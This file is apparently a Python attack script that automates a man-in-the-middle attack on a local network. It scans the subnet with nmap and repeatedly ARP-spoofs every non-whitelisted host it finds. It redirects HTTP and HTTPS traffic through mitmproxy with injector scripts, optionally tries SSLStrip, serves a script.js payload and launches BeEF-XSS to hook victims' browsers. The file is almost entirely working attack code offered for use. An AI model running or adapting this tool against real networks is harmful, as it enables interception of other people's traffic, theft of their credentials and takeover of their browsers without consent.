import subprocess, re, os, sys, threading


#### BEGIN CONFIG ####

whitelist = 'whitelist.txt' # IP addresses not to target
port = '8080' # port for MITMProxy
adapter = 'eth0' # change to match your ifconfig setup (eth0, eth1, wlan0, etc.)
sslstrip = False; # attempt SSLStrip? (very buggy)

####  END CONFIG  ####

def get_victims():
    victims = []
    range = gateway.split('.')
    del range[3]
    range = '.'.join(range) + '.1-255'
    ip_str = str(subprocess.check_output(['nmap','-sn',range])) # use nmap -n to get connected devices
    ip_list = re.findall("\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}", ip_str) # use regex to turn the output into a list of ip's

    if not os.path.isfile(whitelist):
        victims = ip_list
        print("No %s! Continuing...") % whitelist
    else:
        for ip in ip_list:
            if not ip == gateway and not ip == lhost and not ip in open(whitelist).read():
                # add ip to victims list if it's valid
                victims.append(ip)
            else:
                print("Skipping ip " + ip)

    return victims

def victimize(v, old = []):
    threading.Timer(60.0, victimize, [get_victims(), v]).start()
    compare_victims = list(set(v) - set(old))
    if compare_victims:
        print("New victims: ")
        for victim in compare_victims:
            os.system("xterm -e arpspoof -i " + adapter + " -t " + victim + " " + gateway + " &")
            os.system("xterm -e arpspoof -i " + adapter + " -t " + gateway + " " + victim + " &")
            print(victim)

# get gateway ip (router)
gateway = sys.argv[1]
print("gateway: " + gateway)
# get local ipv4 from 'ip addr'
lhost = os.popen('ip addr show ' + adapter).read().split("inet ")[1].split("/")[0]
print("local ip: " + lhost)
# get victim ip's
victims = get_victims()

# reset iptables
os.system("iptables -P INPUT ACCEPT")
os.system("iptables -P FORWARD ACCEPT")
os.system("iptables -P OUTPUT ACCEPT")
os.system("iptables -t nat -F")
os.system("iptables -t mangle -F")
os.system("iptables -F")
os.system("iptables -X")


# configure routing (IPTABLES)
os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
os.system("iptables -t nat -A POSTROUTING -o " + adapter + " -j MASQUERADE")
os.system("iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port " + port)
os.system("iptables -t nat -A PREROUTING -p tcp --destination-port 443 -j REDIRECT --to-port " + port)

# do the arp spoof, but better (autonomous nmap scanning and updating)
victimize(victims)

# start the http server for serving the script.js, in a new console
os.system("xterm -hold -e 'python3 httpServer.py' &")

# start beef xss
os.system("xterm -hold -e 'beef-xss' &")

# start the mitmproxy
if sslstrip:
    os.system("mitmdump -s 'sslstrip_injector.py " + lhost + "' -T")
else:
    os.system("mitmdump -s 'injector.py " + lhost + "' -T")

